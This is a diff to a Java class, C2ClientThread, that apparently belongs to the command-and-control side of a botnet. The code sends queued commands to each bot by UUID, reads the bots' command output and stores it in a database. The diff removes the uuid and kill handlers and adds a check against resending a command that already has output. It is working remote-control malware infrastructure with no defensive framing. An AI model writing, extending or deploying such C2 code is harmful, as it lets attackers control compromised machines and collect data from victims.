@@ -26,9 +26,6 @@ public class C2ClientThread extends Thread {
         try {
             this.in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             this.out = new PrintWriter(new BufferedWriter(new OutputStreamWriter(socket.getOutputStream())), true);
-//
-
-
         } catch (IOException e) {
             e.printStackTrace();
         }
@@ -45,9 +42,6 @@ public class C2ClientThread extends Thread {
                     Log.i("received response from server", str);
                     switch (str) {
                         // uuid: blah
-                        case "get-uuid":
-                            out.println(uuid.toString());
-                            break;
                         case "set-uuid":
                             String uuidString = in.readLine();
                             Log.e("RECV UUID: ", uuidString);
@@ -65,8 +59,10 @@ public class C2ClientThread extends Thread {
                             //if it is, fetch command from database
                             ArrayList<String> cmds = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.command);
                             String command = cmds.get(0);
+                            ArrayList<String> outs = commandDatabase.getFromDatabase(uuid.toString(), BotEntryContract.BotEntry.output);
+                            String outputs = outs.get(0);
                             //if there is a command, send command and readLine for output
-                            if (!command.equals("")) {
+                            if (!command.equals("") && outputs.equals("")) {
                                 out.println(command);
                                 String output = in.readLine();
                                 commandDatabase.updateDatabase(uuid.toString(), command, output);
@@ -76,24 +72,11 @@ public class C2ClientThread extends Thread {
                                 out.println("None");
                             }
                             break;
-                        case "kill":
-                            this.close();
-                            break;
                     }
                 }
             } catch (IOException e) {
                 e.printStackTrace();
             }
-        }
-    }
-
-    public void close(){
-        try {
-            out.close();
-            in.close();
-            socket.close();
-        } catch (IOException e) {
-            //
         }
     }
 }
